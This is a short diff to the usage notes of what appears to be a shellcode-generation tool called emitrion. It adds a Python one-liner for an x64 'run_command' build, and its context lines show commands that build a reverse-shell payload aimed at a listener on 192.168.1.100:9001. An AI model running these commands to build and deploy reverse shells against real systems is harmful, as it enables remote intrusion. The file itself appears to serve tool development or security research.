@@ -15,6 +15,9 @@ uv run pytest emitrion/tests/test_payload_templates.py::TestReverseShellAutoDeri
 # Build shellcode from a manifest (emitrion CLI)
 uv run emitrion emitrion/manifests/revshell.yaml --lhost 192.168.1.100 --lport 9001 --out emitter_out/
 uv run emitrion emitrion/manifests/revshell.yaml --no-assemble --out emitter_out/  # skip assembly (no assembler on Mac)
+
+# x64 build (Python API, no CLI entry point yet)
+uv run python -c "from emitrion.build_x64 import build_x64; r = build_x64('emitrion/manifests/x64/run_command_x64.yaml', assemble=False); print(r.asm[:200])"
 ```
 
 Python 3.13 via uv. The `.venv` is managed by uv; use `uv run` for all commands. Do not use system Python or conda.
